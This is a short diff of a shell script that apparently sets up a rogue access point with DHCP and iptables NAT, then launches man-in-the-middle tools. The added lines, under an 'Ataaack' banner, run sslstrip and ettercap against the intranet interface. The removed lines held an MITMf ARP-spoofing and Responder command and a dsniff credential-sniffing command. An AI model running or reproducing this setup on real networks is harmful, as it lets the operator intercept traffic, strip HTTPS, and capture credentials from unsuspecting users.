@@ -24,6 +24,7 @@ config_intranet(){
     #route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
 }
 
+
 setup_iptables(){
     iptables -F
     iptables -t nat -F
@@ -53,7 +54,6 @@ start_dhcp(){
     service isc-dhcp-server start
 }
 
-    
 echo -n "[INFO] setuping dchp... "
 setup_dhcp
 echo "Done"
@@ -66,6 +66,9 @@ echo -n "[INFO] Setting up iptables rules... "
 setup_iptables
 echo "Done"
 
-#xterm -hold -e python3 MITMf/mitmf.py -i $INTERNET_IFACE --spoof --arp --gateway 192.168.1.0 --responder --wpad &
-xterm -e dsniff -m -i $INTRANTE_IFACE -d -s 4096 -w dsniff$(date +%F-%H%M).log &> /dev/null &
+echo -n "[INFO] Ataaack... "
+sleep 3
+xterm -hold -e sslstrip -f -p -k 10000 &
+sleep 3
+xterm -hold -e ettercap -p -u -T -q -i $INTRANTE_IFACE &
 
